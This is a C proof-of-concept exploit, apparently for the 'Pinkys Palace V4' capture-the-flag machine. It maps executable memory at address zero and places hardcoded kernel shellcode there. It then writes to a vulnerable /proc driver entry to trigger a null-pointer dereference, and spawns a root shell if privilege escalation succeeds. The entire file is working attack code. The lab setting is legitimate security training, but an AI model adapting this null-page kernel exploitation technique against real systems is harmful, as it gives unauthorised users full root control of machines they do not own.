/* Root PoC for Pinkys Palace V4
 * Remember to generate your own kernel space shellcode
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

// Kernel space shellcode
char pay[] = "\x31\xc0\xe8\xc9\x35\x07\xc2\xe8\x54\x32\x07\xc2\xc3";

int main()
{
	printf("[+] UID: %d\n",getuid());
	printf("[+] Mapping 1 page (4KB) of memory @ 0x00000000\n");
	mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	
	printf("[+] Writing payload to allocated page @ 0x00000000\n");
	memcpy(0,pay,sizeof(pay));
	
	printf("[+] Opening target proc entry\n");
	int fd=open("/proc/pqwritedev",O_WRONLY);
	
	printf("[+] Writing to vulnerable driver\n");
	write(fd,"foo",3);
	
	printf("[+] Checking for escalated privileges\n");
	
	if (geteuid() == 0)
	{
		printf("[+] UID: %d\n",getuid());
		printf("[+] w00t p0pping r00t!\n");
		system("/bin/sh");
	}
	else
	{
		printf("[+] UID: %d\n",getuid());
		printf("[+] Did not get r00t :(\n");
	}
	
	return 0;
}

